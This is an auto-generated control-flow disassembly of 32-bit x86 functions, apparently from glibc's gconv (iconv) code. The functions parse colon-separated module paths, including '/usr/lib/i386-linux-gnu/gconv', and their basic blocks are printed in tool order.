0xb01c90e:	pop	esi
0xb01c90f:	pop	edi
0xb01c910:	ret	
None
|
|
|
v
0xb01c8fb:	test	eax, eax
0xb01c8fd:	je	0xb01c920
None
|
|
|
v
0xb01c8e9:	test	esi, esi
0xb01c8eb:	je	0xb01c908
None
|
|
|
v
0xb01c8ff:	js	0xb01c918
None
|
|
|
v
0xb01c901:	mov	esi, dword ptr [esi + 0x1c]
0xb01c904:	test	esi, esi
0xb01c906:	jne	0xb01c8ed
None
|
|
|
v
0xb01c8da:	add	ebx, 0x18e726
0xb01c8e0:	sub	esp, 0x10
0xb01c8e3:	mov	esi, dword ptr [ebx + 0x366c]
0xb01c8e9:	test	esi, esi
0xb01c8eb:	je	0xb01c908
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c930
TOTAL BLOCKS :9
0xb01c9a3:	mov	dword ptr [esp], esi
0xb01c9a6:	call	0xb017470
None
|
|
|
v
0xb01c9ab:	add	esp, 0x1c
0xb01c9ae:	pop	ebx
0xb01c9af:	pop	esi
0xb01c9b0:	pop	edi
0xb01c9b1:	pop	ebp
0xb01c9b2:	ret	
None
|
|
|
v
0xb01c95f:	lea	eax, dword ptr [eax + 8]
0xb01c962:	mov	dword ptr [esp + 8], ebp
0xb01c966:	mov	dword ptr [esp + 4], edi
0xb01c96a:	mov	dword ptr [esp], eax
0xb01c96d:	call	0xb07d0b0
None
|
|
|
v
0xb01c959:	test	eax, eax
0xb01c95b:	mov	esi, eax
0xb01c95d:	je	0xb01c9ab
None
|
|
|
v
0xb01c942:	add	ebx, 0x18e6be
0xb01c948:	mov	dword ptr [esp + 0xc], edx
0xb01c94c:	sub	ebp, eax
0xb01c94e:	lea	eax, dword ptr [ebp + 8]
0xb01c951:	mov	dword ptr [esp], eax
0xb01c954:	call	0xb0173f0
None
|
|
|
v
0xb01c99f:	cmp	esi, dword ptr [eax]
0xb01c9a1:	je	0xb01c9ab
None
|
|
|
v
0xb01c99b:	test	eax, eax
0xb01c99d:	je	0xb01c9a3
None
|
|
|
v
0xb01c972:	mov	ebp, dword ptr [esp + 0xc]
0xb01c976:	mov	dword ptr [esp], esi
0xb01c979:	sub	ebp, edi
0xb01c97b:	mov	dword ptr [esi], eax
0xb01c97d:	add	eax, ebp
0xb01c97f:	mov	dword ptr [esi + 4], eax
0xb01c982:	lea	eax, dword ptr [ebx - 0x18fa70]
0xb01c988:	mov	dword ptr [esp + 8], eax
0xb01c98c:	lea	eax, dword ptr [ebx + 0x3664]
0xb01c992:	mov	dword ptr [esp + 4], eax
0xb01c996:	call	0xb0e7d80
None
|
|
|
v
0xb01c930:	push	ebp
0xb01c931:	push	edi
0xb01c932:	mov	edi, eax
0xb01c934:	push	esi
0xb01c935:	push	ebx
0xb01c936:	sub	esp, 0x1c
0xb01c939:	mov	ebp, dword ptr [esp + 0x30]
0xb01c93d:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c9c0
TOTAL BLOCKS :65
0xb01cad7:	mov	eax, 1
0xb01cadc:	xor	ecx, ecx
0xb01cade:	mov	dword ptr [ebp - 0x2c], esi
0xb01cae1:	mov	esi, edi
0xb01cae3:	mov	edi, eax
0xb01cae5:	jmp	0xb01caec
None
|
|
|
v
0xb01cbf1:	mov	dword ptr [esp + 4], esi
0xb01cbf5:	mov	dword ptr [esp], ecx
0xb01cbf8:	call	0xb07cd00
None
|
|
|
v
0xb01cbfd:	cmp	byte ptr [eax - 1], 0x2f
0xb01cc01:	mov	edx, eax
0xb01cc03:	je	0xb01cc0b
None
|
|
|
v
0xb01cba3:	mov	edi, edx
0xb01cba5:	movzx	eax, byte ptr [edi]
0xb01cba8:	test	al, al
0xb01cbaa:	jne	0xb01cb98
None
|
|
|
v
0xb01ca2b:	mov	dword ptr [esp], edi
0xb01ca2e:	call	0xb07ae80
None
|
|
|
v
0xb01cba5:	movzx	eax, byte ptr [edi]
0xb01cba8:	test	al, al
0xb01cbaa:	jne	0xb01cb98
None
|
|
|
v
0xb01d1f8:	jmp	0xb01c9f3
None
|
|
|
v
0xb01cc59:	movzx	eax, byte ptr [edi]
0xb01cc5c:	test	al, al
0xb01cc5e:	jne	0xb01cc50
None
|
|
|
v
0xb01cb69:	lea	eax, dword ptr [ebx - 0x4b00b]
0xb01cb6f:	mov	dword ptr [esp + 0xc], eax
0xb01cb73:	lea	eax, dword ptr [ebx - 0x4b050]
0xb01cb79:	mov	dword ptr [esp + 4], eax
0xb01cb7d:	lea	eax, dword ptr [ebx - 0x4b030]
0xb01cb83:	mov	dword ptr [esp + 8], 0x1f4
0xb01cb8b:	mov	dword ptr [esp], eax
0xb01cb8e:	call	0xb027820
None
|
|
|
v
0xb01cb23:	add	eax, ecx
0xb01cb25:	add	eax, dword ptr [ebp - 0x1c]
0xb01cb28:	mov	dword ptr [ebp - 0x24], ecx
0xb01cb2b:	add	eax, edx
0xb01cb2d:	mov	dword ptr [esp], eax
0xb01cb30:	call	0xb0173f0
None
|
|
|
v
0xb01cc23:	lea	ecx, dword ptr [eax + 1]
0xb01cc26:	mov	esi, edi
0xb01cc28:	mov	byte ptr [eax], 0
0xb01cc2b:	movzx	eax, byte ptr [edi]
0xb01cc2e:	add	dword ptr [ebp - 0x24], 1
0xb01cc32:	cmp	al, 0x3a
0xb01cc34:	jne	0xb01cc42
None
|
|
|
v
0xb01cbac:	mov	eax, dword ptr [ebp - 0x2c]
0xb01cbaf:	mov	dword ptr [ebp - 0x24], 0
0xb01cbb6:	lea	ecx, dword ptr [eax + ecx*8 + 8]
0xb01cbba:	mov	dword ptr [ebp - 0x1c], eax
0xb01cbbd:	lea	esi, dword ptr [esi]
0xb01cbc0:	mov	eax, dword ptr [ebp - 0x1c]
0xb01cbc3:	cmp	byte ptr [esi], 0x2f
0xb01cbc6:	mov	dword ptr [eax], ecx
0xb01cbc8:	je	0xb01cbf1
None
|
|
|
v
0xb01ccbe:	sub	esp, 0x30
0xb01ccc1:	mov	ecx, 0x76
0xb01ccc6:	lea	esi, dword ptr [esp + 0x1f]
0xb01ccca:	and	esi, 0xfffffff0
0xb01cccd:	mov	dword ptr [esi], 0x7273752f
0xb01ccd3:	mov	dword ptr [esi + 4], 0x62696c2f
0xb01ccda:	mov	dword ptr [esi + 8], 0x3833692f
0xb01cce1:	mov	dword ptr [esi + 0xc], 0x696c2d36
0xb01cce8:	mov	dword ptr [esi + 0x10], 0x2d78756e
0xb01ccef:	mov	dword ptr [esi + 0x14], 0x2f756e67
0xb01ccf6:	mov	dword ptr [esi + 0x18], 0x6e6f6367
0xb01ccfd:	mov	word ptr [esi + 0x1c], cx
0xb01cd01:	mov	dword ptr [ebp - 0x24], 1
0xb01cd08:	mov	dword ptr [ebp - 0x28], 0
0xb01cd0f:	mov	dword ptr [ebp - 0x20], 0
0xb01cd16:	mov	dword ptr [ebp - 0x1c], 0x1e
0xb01cd1d:	jmp	0xb01cabd
None
|
|
|
v
0xb01c9f3:	mov	esi, dword ptr [ebx + 0x3678]
0xb01c9f9:	test	esi, esi
0xb01c9fb:	je	0xb01ca1d
None
|
|
|
v
0xb01cb93:	nop	
0xb01cb94:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01cacd:	test	eax, eax
0xb01cacf:	mov	edi, eax
0xb01cad1:	je	0xb01cd22
None
|
|
|
v
0xb01cbeb:	lea	ecx, dword ptr [eax + 1]
0xb01cbee:	mov	byte ptr [eax], 0x2f
0xb01cbf1:	mov	dword ptr [esp + 4], esi
0xb01cbf5:	mov	dword ptr [esp], ecx
0xb01cbf8:	call	0xb07cd00
None
|
|
|
v
0xb01cc46:	lea	edi, dword ptr [esi + 1]
0xb01cc49:	jmp	0xb01cc59
None
|
|
|
v
0xb01d1ed:	lea	ecx, dword ptr [ebx + 0xfb4]
0xb01d1f3:	call	0xb0f9430
None
|
|
|
v
0xb01cc38:	add	esi, 1
0xb01cc3b:	movzx	eax, byte ptr [esi]
0xb01cc3e:	cmp	al, 0x3a
0xb01cc40:	je	0xb01cc38
None
|
|
|
v
0xb01cab4:	mov	dword ptr [ebp - 0x28], eax
0xb01cab7:	add	eax, 1
0xb01caba:	mov	dword ptr [ebp - 0x24], eax
0xb01cabd:	mov	dword ptr [esp + 4], 0x3a
0xb01cac5:	mov	dword ptr [esp], esi
0xb01cac8:	call	0xb07a520
None
|
|
|
v
0xb01caec:	lea	eax, dword ptr [ecx + 1]
0xb01caef:	cmp	esi, eax
0xb01caf1:	setne	al
0xb01caf4:	movzx	eax, al
0xb01caf7:	add	edi, eax
0xb01caf9:	lea	eax, dword ptr [esi + 1]
0xb01cafc:	mov	dword ptr [esp + 4], 0x3a
0xb01cb04:	mov	dword ptr [esp], eax
0xb01cb07:	call	0xb07a520
None
|
|
|
v
0xb01cbd5:	mov	eax, dword ptr [ebp - 0x28]
0xb01cbd8:	mov	dword ptr [esp], ecx
0xb01cbdb:	mov	dword ptr [esp + 8], eax
0xb01cbdf:	mov	eax, dword ptr [ebp - 0x20]
0xb01cbe2:	mov	dword ptr [esp + 4], eax
0xb01cbe6:	call	0xb07cad0
None
|
|
|
v
0xb01d208:	jmp	0xb01ca15
None
|
|
|
v
0xb01cc7e:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01cc81:	mov	edx, dword ptr [ebp - 0x24]
0xb01cc84:	lea	eax, dword ptr [ecx + edx*8]
0xb01cc87:	mov	dword ptr [eax], 0
0xb01cc8d:	mov	dword ptr [eax + 4], 0
0xb01cc94:	mov	eax, ecx
0xb01cc96:	mov	dword ptr [ebx + 0x3678], eax
0xb01cc9c:	mov	eax, dword ptr [ebp - 0x20]
0xb01cc9f:	mov	dword ptr [esp], eax
0xb01cca2:	call	0xb017470
None
|
|
|
v
0xb01ca15:	lea	esp, dword ptr [ebp - 0xc]
0xb01ca18:	pop	ebx
0xb01ca19:	pop	esi
0xb01ca1a:	pop	edi
0xb01ca1b:	pop	ebp
0xb01ca1c:	ret	
None
|
|
|
v
0xb01d1fd:	lea	eax, dword ptr [ebx + 0xfb4]
0xb01d203:	call	0xb0f9460
None
|
|
|
v
0xb01cbca:	mov	eax, dword ptr [ebp - 0x20]
0xb01cbcd:	test	eax, eax
0xb01cbcf:	je	0xb01cd33
None
|
|
|
v
0xb01ca58:	mov	edx, 0x76
0xb01ca5d:	mov	word ptr [eax + 0x1d], dx
0xb01ca61:	mov	byte ptr [eax], 0x3a
0xb01ca64:	mov	dword ptr [eax + 1], 0x7273752f
0xb01ca6b:	mov	dword ptr [eax + 5], 0x62696c2f
0xb01ca72:	mov	dword ptr [eax + 9], 0x3833692f
0xb01ca79:	mov	dword ptr [eax + 0xd], 0x696c2d36
0xb01ca80:	mov	dword ptr [eax + 0x11], 0x2d78756e
0xb01ca87:	mov	dword ptr [eax + 0x15], 0x2f756e67
0xb01ca8e:	mov	dword ptr [eax + 0x19], 0x6e6f6367
0xb01ca95:	mov	dword ptr [esp + 4], 0
0xb01ca9d:	mov	dword ptr [esp], 0
0xb01caa4:	call	0xb0dbb60
None
|
|
|
v
0xb01cca7:	jmp	0xb01c9fd
None
|
|
|
v
0xb01cd33:	lea	eax, dword ptr [ebx - 0x4b00b]
0xb01cd39:	mov	dword ptr [esp + 0xc], eax
0xb01cd3d:	lea	eax, dword ptr [ebx - 0x4b050]
0xb01cd43:	mov	dword ptr [esp + 4], eax
0xb01cd47:	lea	eax, dword ptr [ebx - 0x4b043]
0xb01cd4d:	mov	dword ptr [esp + 8], 0x1fa
0xb01cd55:	mov	dword ptr [esp], eax
0xb01cd58:	call	0xb027820
None
|
|
|
v
0xb01ccac:	lea	eax, dword ptr [ebx - 0x61098]
0xb01ccb2:	jmp	0xb01cc96
None
|
|
|
v
0xb01cc42:	test	al, al
0xb01cc44:	je	0xb01cc7e
None
|
|
|
v
0xb01cae8:	mov	ecx, esi
0xb01caea:	mov	esi, eax
0xb01caec:	lea	eax, dword ptr [ecx + 1]
0xb01caef:	cmp	esi, eax
0xb01caf1:	setne	al
0xb01caf4:	movzx	eax, al
0xb01caf7:	add	edi, eax
0xb01caf9:	lea	eax, dword ptr [esi + 1]
0xb01cafc:	mov	dword ptr [esp + 4], 0x3a
0xb01cb04:	mov	dword ptr [esp], eax
0xb01cb07:	call	0xb07a520
None
|
|
|
v
0xb01cb62:	test	al, al
0xb01cb64:	lea	edi, dword ptr [esi + 1]
0xb01cb67:	jne	0xb01cba5
None
|
|
|
v
0xb01cc36:	nop	
None
|
|
|
v
0xb01cb10:	lea	edx, dword ptr [edi - 1]
0xb01cb13:	mov	esi, dword ptr [ebp - 0x2c]
0xb01cb16:	mov	ecx, edi
0xb01cb18:	imul	edx, dword ptr [ebp - 0x24]
0xb01cb1c:	lea	eax, dword ptr [edi*8 + 8]
0xb01cb23:	add	eax, ecx
0xb01cb25:	add	eax, dword ptr [ebp - 0x1c]
0xb01cb28:	mov	dword ptr [ebp - 0x24], ecx
0xb01cb2b:	add	eax, edx
0xb01cb2d:	mov	dword ptr [esp], eax
0xb01cb30:	call	0xb0173f0
None
|
|
|
v
0xb01cb40:	movzx	eax, byte ptr [esi]
0xb01cb43:	mov	dword ptr [ebx + 0x3670], 0
0xb01cb4d:	mov	ecx, dword ptr [ebp - 0x24]
0xb01cb50:	cmp	al, 0x3a
0xb01cb52:	jne	0xb01cb62
None
|
|
|
v
0xb01cc96:	mov	dword ptr [ebx + 0x3678], eax
0xb01cc9c:	mov	eax, dword ptr [ebp - 0x20]
0xb01cc9f:	mov	dword ptr [esp], eax
0xb01cca2:	call	0xb017470
None
|
|
|
v
0xb01cd5d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01c9fd:	cmp	dword ptr gs:[0xc], 0
0xb01ca05:	je	0xb01ca08
None
|
|
|
v
0xb01cc05:	add	eax, 1
0xb01cc08:	mov	byte ptr [edx], 0x2f
0xb01cc0b:	mov	ecx, dword ptr [ebp - 0x1c]
0xb01cc0e:	mov	edx, eax
0xb01cc10:	sub	edx, dword ptr [ecx]
0xb01cc12:	cmp	edx, dword ptr [ebx + 0x3670]
0xb01cc18:	mov	dword ptr [ecx + 4], edx
0xb01cc1b:	jbe	0xb01cc23
None
|
|
|
v
0xb01c9e5:	lock cmpxchg	dword ptr [ebx + 0xfb4], ecx
0xb01c9ed:	jne	0xb01d1ed
None
|
|
|
v
0xb01caa9:	mov	dword ptr [esp], eax
0xb01caac:	mov	dword ptr [ebp - 0x20], eax
0xb01caaf:	call	0xb07ae80
None
|
|
|
v
0xb01cbc0:	mov	eax, dword ptr [ebp - 0x1c]
0xb01cbc3:	cmp	byte ptr [esi], 0x2f
0xb01cbc6:	mov	dword ptr [eax], ecx
0xb01cbc8:	je	0xb01cbf1
None
|
|
|
v
0xb01c9d5:	add	ebx, 0x18e62b
0xb01c9db:	cmp	dword ptr gs:[0xc], 0
0xb01c9e3:	je	0xb01c9e6
None
|
|
|
v
0xb01cc60:	add	dword ptr [ebp - 0x1c], 8
0xb01cc64:	jmp	0xb01cbc0
None
|
|
|
v
0xb01cc1d:	mov	dword ptr [ebx + 0x3670], edx
0xb01cc23:	lea	ecx, dword ptr [eax + 1]
0xb01cc26:	mov	esi, edi
0xb01cc28:	mov	byte ptr [eax], 0
0xb01cc2b:	movzx	eax, byte ptr [edi]
0xb01cc2e:	add	dword ptr [ebp - 0x24], 1
0xb01cc32:	cmp	al, 0x3a
0xb01cc34:	jne	0xb01cc42
None
|
|
|
v
0xb01cb98:	cmp	al, 0x3a
0xb01cb9a:	lea	edx, dword ptr [edi + 1]
0xb01cb9d:	je	0xb01ccb4
None
|
|
|
v
0xb01cc0b:	mov	ecx, dword ptr [ebp - 0x1c]
0xb01cc0e:	mov	edx, eax
0xb01cc10:	sub	edx, dword ptr [ecx]
0xb01cc12:	cmp	edx, dword ptr [ebx + 0x3670]
0xb01cc18:	mov	dword ptr [ecx + 4], edx
0xb01cc1b:	jbe	0xb01cc23
None
|
|
|
v
0xb01cc50:	cmp	al, 0x3a
0xb01cc52:	lea	edx, dword ptr [edi + 1]
0xb01cc55:	je	0xb01cc70
None
|
|
|
v
0xb01c9c0:	push	ebp
0xb01c9c1:	xor	eax, eax
0xb01c9c3:	mov	ebp, esp
0xb01c9c5:	mov	ecx, 1
0xb01c9ca:	push	edi
0xb01c9cb:	push	esi
0xb01c9cc:	push	ebx
0xb01c9cd:	sub	esp, 0x3c
0xb01c9d0:	call	0xb1267db
None
|
|
|
v
0xb01cc57:	mov	edi, edx
0xb01cc59:	movzx	eax, byte ptr [edi]
0xb01cc5c:	test	al, al
0xb01cc5e:	jne	0xb01cc50
None
|
|
|
v
0xb01ca33:	lea	edx, dword ptr [eax + 0x3d]
0xb01ca36:	and	edx, 0xfffffff0
0xb01ca39:	sub	esp, edx
0xb01ca3b:	lea	esi, dword ptr [esp + 0x1f]
0xb01ca3f:	and	esi, 0xfffffff0
0xb01ca42:	lea	ecx, dword ptr [eax + 0x1f]
0xb01ca45:	mov	dword ptr [esp + 8], eax
0xb01ca49:	mov	dword ptr [esp + 4], edi
0xb01ca4d:	mov	dword ptr [esp], esi
0xb01ca50:	mov	dword ptr [ebp - 0x1c], ecx
0xb01ca53:	call	0xb07cad0
None
|
|
|
v
0xb01ccb4:	mov	byte ptr [edi], 0
0xb01ccb7:	mov	edi, edx
0xb01ccb9:	jmp	0xb01cbac
None
|
|
|
v
0xb01ca0f:	jne	0xb01d1fd
None
|
|
|
v
0xb01cb0c:	test	eax, eax
0xb01cb0e:	jne	0xb01cae8
None
|
|
|
v
0xb01cabd:	mov	dword ptr [esp + 4], 0x3a
0xb01cac5:	mov	dword ptr [esp], esi
0xb01cac8:	call	0xb07a520
None
|
|
|
v
0xb01cb35:	test	eax, eax
0xb01cb37:	mov	dword ptr [ebp - 0x2c], eax
0xb01cb3a:	je	0xb01ccac
None
|
|
|
v
0xb01ca1d:	mov	edi, dword ptr [ebx + 0x3674]
0xb01ca23:	test	edi, edi
0xb01ca25:	je	0xb01ccbe
None
|
|
|
v
0xb01cc70:	mov	byte ptr [edi], 0
0xb01cc73:	mov	edi, edx
0xb01cc75:	add	dword ptr [ebp - 0x1c], 8
0xb01cc79:	jmp	0xb01cbc0
None
|
|
|
v
0xb01cb54:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01ca07:	lock sub	dword ptr [ebx + 0xfb4], 1
None
|
|
|
v
0xb01cb58:	add	esi, 1
0xb01cb5b:	movzx	eax, byte ptr [esi]
0xb01cb5e:	cmp	al, 0x3a
0xb01cb60:	je	0xb01cb58
None
|
|
|
v
0xb01cd22:	xor	edx, edx
0xb01cd24:	mov	ecx, 1
0xb01cd29:	mov	eax, 0x10
0xb01cd2e:	jmp	0xb01cb23
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01cd60
TOTAL BLOCKS :79
0xb01cea9:	mov	edx, dword ptr [ebp - 0x40]
0xb01ceac:	test	eax, eax
0xb01ceae:	mov	esi, eax
0xb01ceb0:	je	0xb01d1a8
None
|
|
|
v
0xb01cf80:	mov	eax, dword ptr [esi]
0xb01cf82:	mov	dword ptr [esp + 8], edi
0xb01cf86:	mov	dword ptr [ebp - 0x20], eax
0xb01cf89:	mov	eax, dword ptr [ebp - 0x40]
0xb01cf8c:	mov	dword ptr [esp + 4], eax
0xb01cf90:	mov	eax, dword ptr [ebp - 0x44]
0xb01cf93:	mov	dword ptr [esp], eax
0xb01cf96:	call	0xb0e7ee0
None
|
|
|
v
0xb01d16f:	mov	eax, dword ptr [ebx + 0xfb0]
0xb01d175:	mov	ecx, dword ptr [ebp - 0x54]
0xb01d178:	lea	edx, dword ptr [eax + 1]
0xb01d17b:	mov	dword ptr [ebx + 0xfb0], edx
0xb01d181:	mov	edx, dword ptr [ebp - 0x48]
0xb01d184:	mov	dword ptr [esp + 8], eax
0xb01d188:	lea	eax, dword ptr [ebp - 0x28]
0xb01d18b:	mov	dword ptr [esp + 4], eax
0xb01d18f:	lea	eax, dword ptr [ebp - 0x2c]
0xb01d192:	mov	dword ptr [esp], eax
0xb01d195:	mov	eax, esi
0xb01d197:	call	0xb01c580
None
|
|
|
v
0xb01cfab:	lea	esi, dword ptr [ebx - 0x61480]
0xb01cfb1:	jmp	0xb01cfbb
None
|
|
|
v
0xb01d04a:	movzx	edx, byte ptr [esi]
0xb01d04d:	movsx	eax, dl
0xb01d050:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01d055:	je	0xb01d068
None
|
|
|
v
0xb01d07d:	mov	ecx, dword ptr [ebx - 0xf84]
0xb01d083:	mov	eax, esi
0xb01d085:	lea	esi, dword ptr [esi]
0xb01d088:	mov	edx, dword ptr [ecx + edx*4]
0xb01d08b:	add	eax, 1
0xb01d08e:	mov	byte ptr [eax - 1], dl
0xb01d091:	movsx	edx, byte ptr [eax]
0xb01d094:	test	dl, dl
0xb01d096:	je	0xb01cf1f
None
|
|
|
v
0xb01d150:	mov	eax, dword ptr [ebp - 0x50]
0xb01d153:	mov	dword ptr [esp + 8], 6
0xb01d15b:	mov	dword ptr [esp], edx
0xb01d15e:	mov	dword ptr [esp + 4], eax
0xb01d162:	call	0xb07c620
None
|
|
|
v
0xb01cd9c:	test	eax, eax
0xb01cd9e:	je	0xb01d00a
None
|
|
|
v
0xb01cd60:	push	ebp
0xb01cd61:	mov	eax, dword ptr gs:[0]
0xb01cd67:	mov	ebp, esp
0xb01cd69:	push	edi
0xb01cd6a:	push	esi
0xb01cd6b:	push	ebx
0xb01cd6c:	call	0xb1267db
None
|
|
|
v
0xb01cf16:	cmp	eax, 6
0xb01cf19:	je	0xb01d150
None
|
|
|
v
0xb01cf1f:	mov	eax, dword ptr [ebp - 0x3c]
0xb01cf22:	mov	eax, dword ptr [eax]
0xb01cf24:	test	al, 0x10
0xb01cf26:	je	0xb01ce68
None
|
|
|
v
0xb01d19c:	sub	esp, 0xc
0xb01d19f:	jmp	0xb01cf1f
None
|
|
|
v
0xb01cde0:	mov	eax, dword ptr [eax + 4]
0xb01cde3:	mov	ecx, eax
0xb01cde5:	mov	dword ptr [ebp - 0x54], eax
0xb01cde8:	add	eax, 0x2c
0xb01cdeb:	and	eax, 0xfffffff0
0xb01cdee:	sub	esp, eax
0xb01cdf0:	mov	eax, dword ptr [ebp - 0x48]
0xb01cdf3:	lea	esi, dword ptr [esp + 0x1f]
0xb01cdf7:	and	esi, 0xfffffff0
0xb01cdfa:	mov	dword ptr [esp + 8], ecx
0xb01cdfe:	mov	dword ptr [esp + 4], eax
0xb01ce02:	mov	dword ptr [esp], esi
0xb01ce05:	call	0xb07cad0
None
|
|
|
v
0xb01ce93:	mov	edx, dword ptr [ebp - 0x24]
0xb01ce96:	mov	dword ptr [esp + 4], 0x23
0xb01ce9e:	mov	dword ptr [esp], edx
0xb01cea1:	mov	dword ptr [ebp - 0x40], edx
0xb01cea4:	call	0xb07a520
None
|
|
|
v
0xb01d057:	nop	
None
|
|
|
v
0xb01ceef:	mov	esi, edx
0xb01cef1:	jmp	0xb01ceff
None
|
|
|
v
0xb01d129:	mov	edx, dword ptr [ebp - 0x5c]
0xb01d12c:	test	eax, eax
0xb01d12e:	jne	0xb01cf1f
None
|
|
|
v
0xb01d09c:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb01d0a1:	je	0xb01d088
None
|
|
|
v
0xb01d1c6:	jmp	0xb01cfa3
None
|
|
|
v
0xb01d0f7:	mov	esi, dword ptr [ebx - 0xf84]
0xb01d0fd:	add	edx, 1
0xb01d100:	add	eax, 1
0xb01d103:	mov	ecx, dword ptr [esi + ecx*4]
0xb01d106:	mov	byte ptr [edx - 1], cl
0xb01d109:	movsx	ecx, byte ptr [eax]
0xb01d10c:	test	cl, cl
0xb01d10e:	jne	0xb01d0f0
None
|
|
|
v
0xb01ce51:	mov	eax, dword ptr [eax]
0xb01ce53:	mov	dword ptr [ebp - 0x40], eax
0xb01ce56:	or	ah, 0x80
0xb01ce59:	test	al, 0x10
0xb01ce5b:	mov	dword ptr [ecx], eax
0xb01ce5d:	jne	0xb01cf2c
None
|
|
|
v
0xb01cdbf:	lea	ecx, dword ptr [ebx - 0x4b01c]
0xb01cdc5:	mov	dword ptr [ebp - 0x58], ecx
0xb01cdc8:	lea	ecx, dword ptr [ebp - 0x20]
0xb01cdcb:	mov	dword ptr [ebp - 0x44], ecx
0xb01cdce:	lea	ecx, dword ptr [ebx - 0x4b012]
0xb01cdd4:	mov	dword ptr [ebp - 0x4c], 8
0xb01cddb:	mov	dword ptr [ebp - 0x50], ecx
0xb01cdde:	nop	
0xb01cde0:	mov	eax, dword ptr [eax + 4]
0xb01cde3:	mov	ecx, eax
0xb01cde5:	mov	dword ptr [ebp - 0x54], eax
0xb01cde8:	add	eax, 0x2c
0xb01cdeb:	and	eax, 0xfffffff0
0xb01cdee:	sub	esp, eax
0xb01cdf0:	mov	eax, dword ptr [ebp - 0x48]
0xb01cdf3:	lea	esi, dword ptr [esp + 0x1f]
0xb01cdf7:	and	esi, 0xfffffff0
0xb01cdfa:	mov	dword ptr [esp + 8], ecx
0xb01cdfe:	mov	dword ptr [esp + 4], eax
0xb01ce02:	mov	dword ptr [esp], esi
0xb01ce05:	call	0xb07cad0
None
|
|
|
v
0xb01ceb9:	mov	edi, dword ptr [ebx - 0xf8c]
0xb01cebf:	movsx	eax, byte ptr [edx]
0xb01cec2:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01cec7:	je	0xb01cedd
None
|
|
|
v
0xb01d1a8:	lea	eax, dword ptr [edx + edi - 1]
0xb01d1ac:	cmp	byte ptr [eax], 0xa
0xb01d1af:	jne	0xb01ceb9
None
|
|
|
v
0xb01d0f0:	test	byte ptr [edi + ecx*2 + 1], 0x20
0xb01d0f5:	jne	0xb01d110
None
|
|
|
v
0xb01d1bd:	xor	edx, edx
0xb01d1bf:	mov	eax, esi
0xb01d1c1:	call	0xb01c480
None
|
|
|
v
0xb01cd71:	add	ebx, 0x18e28f
0xb01cd77:	sub	esp, 0x6c
0xb01cd7a:	mov	dword ptr [ebp - 0x64], eax
0xb01cd7d:	mov	dword ptr [ebp - 0x2c], 0
0xb01cd84:	mov	dword ptr [ebp - 0x28], 0
0xb01cd8b:	mov	ecx, dword ptr [ebx - 0xdc]
0xb01cd91:	mov	eax, dword ptr [eax + ecx]
0xb01cd94:	mov	dword ptr [ebp - 0x60], eax
0xb01cd97:	call	0xb023d10
None
|
|
|
v
0xb01d058:	add	esi, 1
0xb01d05b:	movzx	edx, byte ptr [esi]
0xb01d05e:	movsx	eax, dl
0xb01d061:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01d066:	jne	0xb01d058
None
|
|
|
v
0xb01d088:	mov	edx, dword ptr [ecx + edx*4]
0xb01d08b:	add	eax, 1
0xb01d08e:	mov	byte ptr [eax - 1], dl
0xb01d091:	movsx	edx, byte ptr [eax]
0xb01d094:	test	dl, dl
0xb01d096:	je	0xb01cf1f
None
|
|
|
v
0xb01ceb6:	mov	byte ptr [eax], 0
0xb01ceb9:	mov	edi, dword ptr [ebx - 0xf8c]
0xb01cebf:	movsx	eax, byte ptr [edx]
0xb01cec2:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01cec7:	je	0xb01cedd
None
|
|
|
v
0xb01d0e5:	mov	edx, dword ptr [ebp - 0x40]
0xb01d0e8:	mov	dword ptr [ebp - 0x5c], esi
0xb01d0eb:	jmp	0xb01d0f7
None
|
|
|
v
0xb01ce89:	test	eax, eax
0xb01ce8b:	mov	edi, eax
0xb01ce8d:	js	0xb01cf2c
None
|
|
|
v
0xb01d042:	test	eax, eax
0xb01d044:	jne	0xb01cf1f
None
|
|
|
v
0xb01d11c:	mov	byte ptr [edx], 0
0xb01d11f:	mov	eax, esi
0xb01d121:	mov	dword ptr [ebp - 0x5c], edx
0xb01d124:	call	0xb01c8d0
None
|
|
|
v
0xb01d0d0:	test	cl, cl
0xb01d0d2:	je	0xb01cf1f
None
|
|
|
v
0xb01d1d2:	lea	eax, dword ptr [ebp - 0x20]
0xb01d1d5:	mov	dword ptr [ebp - 0x44], eax
0xb01d1d8:	jmp	0xb01cf5c
None
|
|
|
v
0xb01d1dd:	call	0xb01c9c0
None
|
|
|
v
0xb01ceff:	add	esi, 1
0xb01cf02:	movsx	eax, byte ptr [esi]
0xb01cf05:	test	al, al
0xb01cf07:	jne	0xb01cef8
None
|
|
|
v
0xb01ce63:	nop	
0xb01ce64:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01cf5c:	lea	esi, dword ptr [ebx + 0x240]
0xb01cf62:	lea	eax, dword ptr [esi + 0x180]
0xb01cf68:	mov	dword ptr [ebp - 0x3c], eax
0xb01cf6b:	lea	eax, dword ptr [ebx + 0x3664]
0xb01cf71:	lea	edi, dword ptr [ebx - 0x18fa70]
0xb01cf77:	mov	dword ptr [ebp - 0x40], eax
0xb01cf7a:	lea	esi, dword ptr [esi]
0xb01cf80:	mov	eax, dword ptr [esi]
0xb01cf82:	mov	dword ptr [esp + 8], edi
0xb01cf86:	mov	dword ptr [ebp - 0x20], eax
0xb01cf89:	mov	eax, dword ptr [ebp - 0x40]
0xb01cf8c:	mov	dword ptr [esp + 4], eax
0xb01cf90:	mov	eax, dword ptr [ebp - 0x44]
0xb01cf93:	mov	dword ptr [esp], eax
0xb01cf96:	call	0xb0e7ee0
None
|
|
|
v
0xb01d144:	jmp	0xb01cf1f
None
|
|
|
v
0xb01cee8:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01ceed:	jne	0xb01cf1f
None
|
|
|
v
0xb01cef8:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01cefd:	jne	0xb01cf09
None
|
|
|
v
